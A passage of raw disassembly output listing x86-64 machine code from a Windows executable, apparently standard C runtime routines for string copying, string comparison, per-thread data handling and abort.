   1400055d4:	48 8d 15 35 a0 00 00 	lea    0xa035(%rip),%rdx        # 0x14000f610
   1400055db:	48 8d 0d 2e 9f 00 00 	lea    0x9f2e(%rip),%rcx        # 0x14000f510
   1400055e2:	e9 7d 38 00 00       	jmp    0x140008e64
   1400055e7:	cc                   	int3
   1400055e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400055ec:	84 c9                	test   %cl,%cl
   1400055ee:	74 16                	je     0x140005606
   1400055f0:	48 83 3d d8 41 01 00 	cmpq   $0x0,0x141d8(%rip)        # 0x1400197d0
   1400055f7:	00 
   1400055f8:	74 05                	je     0x1400055ff
   1400055fa:	e8 0d 40 00 00       	call   0x14000960c
   1400055ff:	b0 01                	mov    $0x1,%al
   140005601:	48 83 c4 28          	add    $0x28,%rsp
   140005605:	c3                   	ret
   140005606:	48 8d 15 03 a0 00 00 	lea    0xa003(%rip),%rdx        # 0x14000f610
   14000560d:	48 8d 0d fc 9e 00 00 	lea    0x9efc(%rip),%rcx        # 0x14000f510
   140005614:	48 83 c4 28          	add    $0x28,%rsp
   140005618:	e9 db 38 00 00       	jmp    0x140008ef8
   14000561d:	cc                   	int3
   14000561e:	cc                   	int3
   14000561f:	cc                   	int3
   140005620:	48 83 ec 28          	sub    $0x28,%rsp
   140005624:	e8 2b 06 00 00       	call   0x140005c54
   140005629:	48 8b 40 18          	mov    0x18(%rax),%rax
   14000562d:	48 85 c0             	test   %rax,%rax
   140005630:	74 12                	je     0x140005644
   140005632:	49 ba 70 48 da 56 96 	movabs $0x85f13e9656da4870,%r10
   140005639:	3e f1 85 
   14000563c:	ff 15 26 8c 00 00    	call   *0x8c26(%rip)        # 0x14000e268
   140005642:	eb 00                	jmp    0x140005644
   140005644:	e8 7f 00 00 00       	call   0x1400056c8
   140005649:	90                   	nop
   14000564a:	cc                   	int3
   14000564b:	cc                   	int3
   14000564c:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%rsp)
   140005653:	00 
   140005654:	8b 44 24 10          	mov    0x10(%rsp),%eax
   140005658:	e9 cf 0f 00 00       	jmp    0x14000662c
   14000565d:	cc                   	int3
   14000565e:	cc                   	int3
   14000565f:	cc                   	int3
   140005660:	e9 97 2c 00 00       	jmp    0x1400082fc
   140005665:	cc                   	int3
   140005666:	cc                   	int3
   140005667:	cc                   	int3
   140005668:	40 53                	rex push %rbx
   14000566a:	48 83 ec 20          	sub    $0x20,%rsp
   14000566e:	33 db                	xor    %ebx,%ebx
   140005670:	48 85 c9             	test   %rcx,%rcx
   140005673:	74 0c                	je     0x140005681
   140005675:	48 85 d2             	test   %rdx,%rdx
   140005678:	74 07                	je     0x140005681
   14000567a:	4d 85 c0             	test   %r8,%r8
   14000567d:	75 1b                	jne    0x14000569a
   14000567f:	88 19                	mov    %bl,(%rcx)
   140005681:	e8 0e 0f 00 00       	call   0x140006594
   140005686:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000568b:	89 18                	mov    %ebx,(%rax)
   14000568d:	e8 aa 0c 00 00       	call   0x14000633c
   140005692:	8b c3                	mov    %ebx,%eax
   140005694:	48 83 c4 20          	add    $0x20,%rsp
   140005698:	5b                   	pop    %rbx
   140005699:	c3                   	ret
   14000569a:	4c 8b c9             	mov    %rcx,%r9
   14000569d:	4c 2b c1             	sub    %rcx,%r8
   1400056a0:	43 8a 04 08          	mov    (%r8,%r9,1),%al
   1400056a4:	41 88 01             	mov    %al,(%r9)
   1400056a7:	49 ff c1             	inc    %r9
   1400056aa:	84 c0                	test   %al,%al
   1400056ac:	74 e4                	je     0x140005692
   1400056ae:	48 83 ea 01          	sub    $0x1,%rdx
   1400056b2:	75 ec                	jne    0x1400056a0
   1400056b4:	48 85 d2             	test   %rdx,%rdx
   1400056b7:	75 d9                	jne    0x140005692
   1400056b9:	88 19                	mov    %bl,(%rcx)
   1400056bb:	e8 d4 0e 00 00       	call   0x140006594
   1400056c0:	bb 22 00 00 00       	mov    $0x22,%ebx
   1400056c5:	eb c4                	jmp    0x14000568b
   1400056c7:	cc                   	int3
   1400056c8:	48 83 ec 28          	sub    $0x28,%rsp
   1400056cc:	e8 2f 39 00 00       	call   0x140009000
   1400056d1:	48 85 c0             	test   %rax,%rax
   1400056d4:	74 0a                	je     0x1400056e0
   1400056d6:	b9 16 00 00 00       	mov    $0x16,%ecx
   1400056db:	e8 70 39 00 00       	call   0x140009050
   1400056e0:	f6 05 b9 29 01 00 02 	testb  $0x2,0x129b9(%rip)        # 0x1400180a0
   1400056e7:	74 2a                	je     0x140005713
   1400056e9:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400056ee:	ff 15 7c 89 00 00    	call   *0x897c(%rip)        # 0x14000e070
   1400056f4:	85 c0                	test   %eax,%eax
   1400056f6:	74 07                	je     0x1400056ff
   1400056f8:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400056fd:	cd 29                	int    $0x29
   1400056ff:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005705:	ba 15 00 00 40       	mov    $0x40000015,%edx
   14000570a:	41 8d 48 02          	lea    0x2(%r8),%ecx
   14000570e:	e8 59 09 00 00       	call   0x14000606c
   140005713:	b9 03 00 00 00       	mov    $0x3,%ecx
   140005718:	e8 93 f7 ff ff       	call   0x140004eb0
   14000571d:	cc                   	int3
   14000571e:	cc                   	int3
   14000571f:	cc                   	int3
   140005720:	e9 8f 0e 00 00       	jmp    0x1400065b4
   140005725:	cc                   	int3
   140005726:	cc                   	int3
   140005727:	cc                   	int3
   140005728:	cc                   	int3
   140005729:	cc                   	int3
   14000572a:	cc                   	int3
   14000572b:	cc                   	int3
   14000572c:	cc                   	int3
   14000572d:	cc                   	int3
   14000572e:	cc                   	int3
   14000572f:	cc                   	int3
   140005730:	40 57                	rex push %rdi
   140005732:	48 83 ec 20          	sub    $0x20,%rsp
   140005736:	48 83 39 00          	cmpq   $0x0,(%rcx)
   14000573a:	48 8b f9             	mov    %rcx,%rdi
   14000573d:	75 49                	jne    0x140005788
   14000573f:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140005744:	ff 15 46 89 00 00    	call   *0x8946(%rip)        # 0x14000e090
   14000574a:	80 7f 10 00          	cmpb   $0x0,0x10(%rdi)
   14000574e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140005752:	75 0c                	jne    0x140005760
   140005754:	33 d2                	xor    %edx,%edx
   140005756:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   14000575a:	48 89 57 08          	mov    %rdx,0x8(%rdi)
   14000575e:	eb 04                	jmp    0x140005764
   140005760:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   140005764:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005769:	e8 26 07 00 00       	call   0x140005e94
   14000576e:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140005772:	48 8b d8             	mov    %rax,%rbx
   140005775:	48 89 07             	mov    %rax,(%rdi)
   140005778:	ff 15 1a 89 00 00    	call   *0x891a(%rip)        # 0x14000e098
   14000577e:	48 85 db             	test   %rbx,%rbx
   140005781:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140005786:	74 09                	je     0x140005791
   140005788:	48 8b 07             	mov    (%rdi),%rax
   14000578b:	48 83 c4 20          	add    $0x20,%rsp
   14000578f:	5f                   	pop    %rdi
   140005790:	c3                   	ret
   140005791:	e8 32 ff ff ff       	call   0x1400056c8
   140005796:	cc                   	int3
   140005797:	cc                   	int3
   140005798:	cc                   	int3
   140005799:	cc                   	int3
   14000579a:	cc                   	int3
   14000579b:	cc                   	int3
   14000579c:	cc                   	int3
   14000579d:	cc                   	int3
   14000579e:	cc                   	int3
   14000579f:	cc                   	int3
   1400057a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400057a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400057aa:	57                   	push   %rdi
   1400057ab:	48 83 ec 20          	sub    $0x20,%rsp
   1400057af:	48 8b f9             	mov    %rcx,%rdi
   1400057b2:	e8 79 ff ff ff       	call   0x140005730
   1400057b7:	48 8d 57 18          	lea    0x18(%rdi),%rdx
   1400057bb:	48 8b c8             	mov    %rax,%rcx
   1400057be:	48 8b f0             	mov    %rax,%rsi
   1400057c1:	4c 8b 80 90 00 00 00 	mov    0x90(%rax),%r8
   1400057c8:	4c 89 02             	mov    %r8,(%rdx)
   1400057cb:	4c 8b 80 88 00 00 00 	mov    0x88(%rax),%r8
   1400057d2:	4c 89 47 20          	mov    %r8,0x20(%rdi)
   1400057d6:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   1400057da:	e8 fd 3f 00 00       	call   0x1400097dc
   1400057df:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   1400057e3:	48 8d 57 20          	lea    0x20(%rdi),%rdx
   1400057e7:	48 8b ce             	mov    %rsi,%rcx
   1400057ea:	e8 59 40 00 00       	call   0x140009848
   1400057ef:	8b 86 a8 03 00 00    	mov    0x3a8(%rsi),%eax
   1400057f5:	a8 02                	test   $0x2,%al
   1400057f7:	75 0d                	jne    0x140005806
   1400057f9:	83 c8 02             	or     $0x2,%eax
   1400057fc:	89 86 a8 03 00 00    	mov    %eax,0x3a8(%rsi)
   140005802:	c6 47 28 02          	movb   $0x2,0x28(%rdi)
   140005806:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000580b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005810:	48 83 c4 20          	add    $0x20,%rsp
   140005814:	5f                   	pop    %rdi
   140005815:	c3                   	ret
   140005816:	cc                   	int3
   140005817:	cc                   	int3
   140005818:	cc                   	int3
   140005819:	cc                   	int3
   14000581a:	cc                   	int3
   14000581b:	cc                   	int3
   14000581c:	cc                   	int3
   14000581d:	cc                   	int3
   14000581e:	cc                   	int3
   14000581f:	cc                   	int3
   140005820:	cc                   	int3
   140005821:	cc                   	int3
   140005822:	cc                   	int3
   140005823:	cc                   	int3
   140005824:	cc                   	int3
   140005825:	cc                   	int3
   140005826:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000582d:	00 00 00 
   140005830:	48 2b d1             	sub    %rcx,%rdx
   140005833:	4d 85 c0             	test   %r8,%r8
   140005836:	74 6a                	je     0x1400058a2
   140005838:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   14000583e:	74 1d                	je     0x14000585d
   140005840:	0f b6 01             	movzbl (%rcx),%eax
   140005843:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   140005846:	75 5d                	jne    0x1400058a5
   140005848:	48 ff c1             	inc    %rcx
   14000584b:	49 ff c8             	dec    %r8
   14000584e:	74 52                	je     0x1400058a2
   140005850:	84 c0                	test   %al,%al
   140005852:	74 4e                	je     0x1400058a2
   140005854:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   14000585b:	75 e3                	jne    0x140005840
   14000585d:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   140005864:	80 80 80 
   140005867:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   14000586e:	fe fe fe 
   140005871:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   140005874:	25 ff 0f 00 00       	and    $0xfff,%eax
   140005879:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   14000587e:	77 c0                	ja     0x140005840
   140005880:	48 8b 01             	mov    (%rcx),%rax
   140005883:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   140005887:	75 b7                	jne    0x140005840
   140005889:	48 83 c1 08          	add    $0x8,%rcx
   14000588d:	49 83 e8 08          	sub    $0x8,%r8
   140005891:	76 0f                	jbe    0x1400058a2
   140005893:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   140005897:	48 f7 d0             	not    %rax
   14000589a:	49 23 c1             	and    %r9,%rax
   14000589d:	49 85 c3             	test   %rax,%r11
   1400058a0:	74 cf                	je     0x140005871
   1400058a2:	33 c0                	xor    %eax,%eax
   1400058a4:	c3                   	ret
   1400058a5:	48 1b c0             	sbb    %rax,%rax
   1400058a8:	48 83 c8 01          	or     $0x1,%rax
   1400058ac:	c3                   	ret
   1400058ad:	cc                   	int3
   1400058ae:	cc                   	int3
   1400058af:	cc                   	int3
   1400058b0:	4d 85 c0             	test   %r8,%r8
   1400058b3:	75 18                	jne    0x1400058cd
   1400058b5:	33 c0                	xor    %eax,%eax
   1400058b7:	c3                   	ret
   1400058b8:	0f b7 01             	movzwl (%rcx),%eax
   1400058bb:	66 85 c0             	test   %ax,%ax
   1400058be:	74 13                	je     0x1400058d3
   1400058c0:	66 3b 02             	cmp    (%rdx),%ax
   1400058c3:	75 0e                	jne    0x1400058d3
   1400058c5:	48 83 c1 02          	add    $0x2,%rcx
   1400058c9:	48 83 c2 02          	add    $0x2,%rdx
   1400058cd:	49 83 e8 01          	sub    $0x1,%r8
   1400058d1:	75 e5                	jne    0x1400058b8
   1400058d3:	0f b7 01             	movzwl (%rcx),%eax
   1400058d6:	0f b7 0a             	movzwl (%rdx),%ecx
   1400058d9:	2b c1                	sub    %ecx,%eax
   1400058db:	c3                   	ret
   1400058dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400058e1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400058e6:	57                   	push   %rdi
   1400058e7:	48 83 ec 20          	sub    $0x20,%rsp
   1400058eb:	49 8b d9             	mov    %r9,%rbx
   1400058ee:	49 8b f8             	mov    %r8,%rdi
   1400058f1:	8b 0a                	mov    (%rdx),%ecx
   1400058f3:	e8 f0 20 00 00       	call   0x1400079e8
   1400058f8:	90                   	nop
   1400058f9:	48 8b 07             	mov    (%rdi),%rax
   1400058fc:	48 8b 08             	mov    (%rax),%rcx
   1400058ff:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140005906:	f0 ff 00             	lock incl (%rax)
   140005909:	8b 0b                	mov    (%rbx),%ecx
   14000590b:	e8 2c 21 00 00       	call   0x140007a3c
   140005910:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005915:	48 83 c4 20          	add    $0x20,%rsp
   140005919:	5f                   	pop    %rdi
   14000591a:	c3                   	ret
   14000591b:	cc                   	int3
   14000591c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005921:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005926:	57                   	push   %rdi
   140005927:	48 83 ec 20          	sub    $0x20,%rsp
   14000592b:	49 8b d9             	mov    %r9,%rbx
   14000592e:	49 8b f8             	mov    %r8,%rdi
   140005931:	8b 0a                	mov    (%rdx),%ecx
   140005933:	e8 b0 20 00 00       	call   0x1400079e8
   140005938:	90                   	nop
   140005939:	48 8b 0f             	mov    (%rdi),%rcx
   14000593c:	33 d2                	xor    %edx,%edx
   14000593e:	48 8b 09             	mov    (%rcx),%rcx
   140005941:	e8 a6 02 00 00       	call   0x140005bec
   140005946:	90                   	nop
   140005947:	8b 0b                	mov    (%rbx),%ecx
   140005949:	e8 ee 20 00 00       	call   0x140007a3c
   14000594e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005953:	48 83 c4 20          	add    $0x20,%rsp
   140005957:	5f                   	pop    %rdi
   140005958:	c3                   	ret
   140005959:	cc                   	int3
   14000595a:	cc                   	int3
   14000595b:	cc                   	int3
   14000595c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005961:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005966:	57                   	push   %rdi
   140005967:	48 83 ec 20          	sub    $0x20,%rsp
   14000596b:	49 8b d9             	mov    %r9,%rbx
   14000596e:	49 8b f8             	mov    %r8,%rdi
   140005971:	8b 0a                	mov    (%rdx),%ecx
   140005973:	e8 70 20 00 00       	call   0x1400079e8
   140005978:	90                   	nop
   140005979:	48 8b 47 08          	mov    0x8(%rdi),%rax
   14000597d:	48 8b 10             	mov    (%rax),%rdx
   140005980:	48 8b 0f             	mov    (%rdi),%rcx
   140005983:	48 8b 12             	mov    (%rdx),%rdx
   140005986:	48 8b 09             	mov    (%rcx),%rcx
   140005989:	e8 5e 02 00 00       	call   0x140005bec
   14000598e:	90                   	nop
   14000598f:	8b 0b                	mov    (%rbx),%ecx
   140005991:	e8 a6 20 00 00       	call   0x140007a3c
   140005996:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000599b:	48 83 c4 20          	add    $0x20,%rsp
   14000599f:	5f                   	pop    %rdi
   1400059a0:	c3                   	ret
   1400059a1:	cc                   	int3
   1400059a2:	cc                   	int3
   1400059a3:	cc                   	int3
   1400059a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400059a9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400059ae:	57                   	push   %rdi
   1400059af:	48 83 ec 20          	sub    $0x20,%rsp
   1400059b3:	49 8b d9             	mov    %r9,%rbx
   1400059b6:	49 8b f8             	mov    %r8,%rdi
   1400059b9:	8b 0a                	mov    (%rdx),%ecx
   1400059bb:	e8 28 20 00 00       	call   0x1400079e8
   1400059c0:	90                   	nop
   1400059c1:	48 8b 07             	mov    (%rdi),%rax
   1400059c4:	48 8b 08             	mov    (%rax),%rcx
   1400059c7:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   1400059ce:	48 85 c9             	test   %rcx,%rcx
   1400059d1:	74 1e                	je     0x1400059f1
   1400059d3:	83 c8 ff             	or     $0xffffffff,%eax
   1400059d6:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   1400059da:	83 f8 01             	cmp    $0x1,%eax
   1400059dd:	75 12                	jne    0x1400059f1
   1400059df:	48 8d 05 da 26 01 00 	lea    0x126da(%rip),%rax        # 0x1400180c0
   1400059e6:	48 3b c8             	cmp    %rax,%rcx
   1400059e9:	74 06                	je     0x1400059f1
   1400059eb:	e8 3c 0c 00 00       	call   0x14000662c
   1400059f0:	90                   	nop
   1400059f1:	8b 0b                	mov    (%rbx),%ecx
   1400059f3:	e8 44 20 00 00       	call   0x140007a3c
   1400059f8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400059fd:	48 83 c4 20          	add    $0x20,%rsp
   140005a01:	5f                   	pop    %rdi
   140005a02:	c3                   	ret
   140005a03:	cc                   	int3
   140005a04:	40 55                	rex push %rbp
   140005a06:	48 8b ec             	mov    %rsp,%rbp
   140005a09:	48 83 ec 50          	sub    $0x50,%rsp
   140005a0d:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   140005a11:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140005a15:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140005a19:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140005a1d:	ba 01 00 00 00       	mov    $0x1,%edx
   140005a22:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140005a26:	b8 05 00 00 00       	mov    $0x5,%eax
   140005a2b:	89 45 20             	mov    %eax,0x20(%rbp)
   140005a2e:	89 45 28             	mov    %eax,0x28(%rbp)
   140005a31:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140005a35:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005a39:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140005a3d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140005a41:	b8 04 00 00 00       	mov    $0x4,%eax
   140005a46:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140005a49:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   140005a4c:	48 8d 05 a5 3b 01 00 	lea    0x13ba5(%rip),%rax        # 0x1400195f8
   140005a53:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140005a57:	89 51 28             	mov    %edx,0x28(%rcx)
   140005a5a:	48 8d 0d 0f 99 00 00 	lea    0x990f(%rip),%rcx        # 0x14000f370
   140005a61:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140005a65:	48 89 08             	mov    %rcx,(%rax)
   140005a68:	48 8d 0d 51 26 01 00 	lea    0x12651(%rip),%rcx        # 0x1400180c0
   140005a6f:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140005a73:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   140005a79:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140005a7d:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   140005a84:	8d 4a 42             	lea    0x42(%rdx),%ecx
   140005a87:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140005a8b:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140005a8f:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   140005a96:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140005a9a:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   140005aa1:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005aa5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140005aa9:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   140005ab0:	00 
   140005ab1:	e8 26 fe ff ff       	call   0x1400058dc
   140005ab6:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   140005aba:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140005abe:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   140005ac2:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005ac6:	e8 91 fe ff ff       	call   0x14000595c
   140005acb:	48 83 c4 50          	add    $0x50,%rsp
   140005acf:	5d                   	pop    %rbp
   140005ad0:	c3                   	ret
   140005ad1:	cc                   	int3
   140005ad2:	cc                   	int3
   140005ad3:	cc                   	int3
   140005ad4:	48 85 c9             	test   %rcx,%rcx
   140005ad7:	74 1a                	je     0x140005af3
   140005ad9:	53                   	push   %rbx
   140005ada:	48 83 ec 20          	sub    $0x20,%rsp
   140005ade:	48 8b d9             	mov    %rcx,%rbx
   140005ae1:	e8 0e 00 00 00       	call   0x140005af4
   140005ae6:	48 8b cb             	mov    %rbx,%rcx
   140005ae9:	e8 3e 0b 00 00       	call   0x14000662c
   140005aee:	48 83 c4 20          	add    $0x20,%rsp
   140005af2:	5b                   	pop    %rbx
   140005af3:	c3                   	ret
   140005af4:	40 55                	rex push %rbp
   140005af6:	48 8b ec             	mov    %rsp,%rbp
   140005af9:	48 83 ec 40          	sub    $0x40,%rsp
   140005afd:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140005b01:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140005b05:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005b09:	48 8d 15 60 98 00 00 	lea    0x9860(%rip),%rdx        # 0x14000f370
   140005b10:	b8 05 00 00 00       	mov    $0x5,%eax
   140005b15:	89 45 20             	mov    %eax,0x20(%rbp)
   140005b18:	89 45 28             	mov    %eax,0x28(%rbp)
   140005b1b:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140005b1f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140005b23:	b8 04 00 00 00       	mov    $0x4,%eax
   140005b28:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140005b2b:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140005b2e:	48 8b 01             	mov    (%rcx),%rax
   140005b31:	48 3b c2             	cmp    %rdx,%rax
   140005b34:	74 0c                	je     0x140005b42
   140005b36:	48 8b c8             	mov    %rax,%rcx
   140005b39:	e8 ee 0a 00 00       	call   0x14000662c
   140005b3e:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005b42:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   140005b46:	e8 e1 0a 00 00       	call   0x14000662c
   140005b4b:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005b4f:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   140005b53:	e8 d4 0a 00 00       	call   0x14000662c
   140005b58:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005b5c:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   140005b60:	e8 c7 0a 00 00       	call   0x14000662c
   140005b65:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005b69:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   140005b6d:	e8 ba 0a 00 00       	call   0x14000662c
   140005b72:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005b76:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   140005b7a:	e8 ad 0a 00 00       	call   0x14000662c
   140005b7f:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005b83:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   140005b87:	e8 a0 0a 00 00       	call   0x14000662c
   140005b8c:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005b90:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   140005b94:	e8 93 0a 00 00       	call   0x14000662c
   140005b99:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005b9d:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005ba4:	e8 83 0a 00 00       	call   0x14000662c
   140005ba9:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005bad:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   140005bb4:	e8 73 0a 00 00       	call   0x14000662c
   140005bb9:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140005bbd:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140005bc1:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140005bc5:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005bc9:	e8 d6 fd ff ff       	call   0x1400059a4
   140005bce:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140005bd2:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   140005bd6:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   140005bda:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005bde:	e8 39 fd ff ff       	call   0x14000591c
   140005be3:	48 83 c4 40          	add    $0x40,%rsp
   140005be7:	5d                   	pop    %rbp
   140005be8:	c3                   	ret
   140005be9:	cc                   	int3
   140005bea:	cc                   	int3
   140005beb:	cc                   	int3
   140005bec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005bf1:	57                   	push   %rdi
   140005bf2:	48 83 ec 20          	sub    $0x20,%rsp
   140005bf6:	48 8b f9             	mov    %rcx,%rdi
   140005bf9:	48 8b da             	mov    %rdx,%rbx
   140005bfc:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   140005c03:	48 85 c9             	test   %rcx,%rcx
   140005c06:	74 2c                	je     0x140005c34
   140005c08:	e8 ab 2b 00 00       	call   0x1400087b8
   140005c0d:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   140005c14:	48 3b 0d dd 39 01 00 	cmp    0x139dd(%rip),%rcx        # 0x1400195f8
   140005c1b:	74 17                	je     0x140005c34
   140005c1d:	48 8d 05 dc 29 01 00 	lea    0x129dc(%rip),%rax        # 0x140018600
   140005c24:	48 3b c8             	cmp    %rax,%rcx
   140005c27:	74 0b                	je     0x140005c34
   140005c29:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   140005c2d:	75 05                	jne    0x140005c34
   140005c2f:	e8 84 29 00 00       	call   0x1400085b8
   140005c34:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   140005c3b:	48 85 db             	test   %rbx,%rbx
   140005c3e:	74 08                	je     0x140005c48
   140005c40:	48 8b cb             	mov    %rbx,%rcx
   140005c43:	e8 e4 28 00 00       	call   0x14000852c
   140005c48:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005c4d:	48 83 c4 20          	add    $0x20,%rsp
   140005c51:	5f                   	pop    %rdi
   140005c52:	c3                   	ret
   140005c53:	cc                   	int3
   140005c54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005c59:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005c5e:	57                   	push   %rdi
   140005c5f:	48 83 ec 20          	sub    $0x20,%rsp
   140005c63:	ff 15 27 84 00 00    	call   *0x8427(%rip)        # 0x14000e090
   140005c69:	8b 0d 41 24 01 00    	mov    0x12441(%rip),%ecx        # 0x1400180b0
   140005c6f:	33 f6                	xor    %esi,%esi
   140005c71:	8b d8                	mov    %eax,%ebx
   140005c73:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005c76:	74 1d                	je     0x140005c95
   140005c78:	e8 e3 2e 00 00       	call   0x140008b60
   140005c7d:	48 8b f8             	mov    %rax,%rdi
   140005c80:	48 85 c0             	test   %rax,%rax
   140005c83:	74 0a                	je     0x140005c8f
   140005c85:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005c89:	48 0f 44 fe          	cmove  %rsi,%rdi
   140005c8d:	eb 72                	jmp    0x140005d01
   140005c8f:	8b 0d 1b 24 01 00    	mov    0x1241b(%rip),%ecx        # 0x1400180b0
   140005c95:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140005c99:	e8 ca 2e 00 00       	call   0x140008b68
   140005c9e:	85 c0                	test   %eax,%eax
   140005ca0:	75 05                	jne    0x140005ca7
   140005ca2:	48 8b fe             	mov    %rsi,%rdi
   140005ca5:	eb 5a                	jmp    0x140005d01
   140005ca7:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140005cac:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005cb1:	e8 fe 08 00 00       	call   0x1400065b4
   140005cb6:	8b 0d f4 23 01 00    	mov    0x123f4(%rip),%ecx        # 0x1400180b0
   140005cbc:	48 8b f8             	mov    %rax,%rdi
